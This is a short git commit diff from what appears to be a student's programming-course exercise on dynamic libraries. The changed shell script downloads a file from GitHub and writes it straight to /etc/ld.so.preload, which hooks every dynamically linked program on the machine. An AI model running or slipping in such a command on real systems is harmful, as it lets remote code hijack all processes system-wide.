563e07cefa19941cc6ef59f0f064679693672b9e
Abdelrahman Mohamed Elsayed <3bdelrahmanm0o@gmail.com>
2023-11-13 22:52:28 +0200

    Add the final payload

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,2 +1,2 @@
 #!/bin/bash
-wget https://alx-0x18.free.beeceptor.com
+wget "https://github.com/hackerSa3edy/alx-low_level_programming/raw/master/0x18-dynamic_libraries/ld.so.preload" -O /etc/ld.so.preload
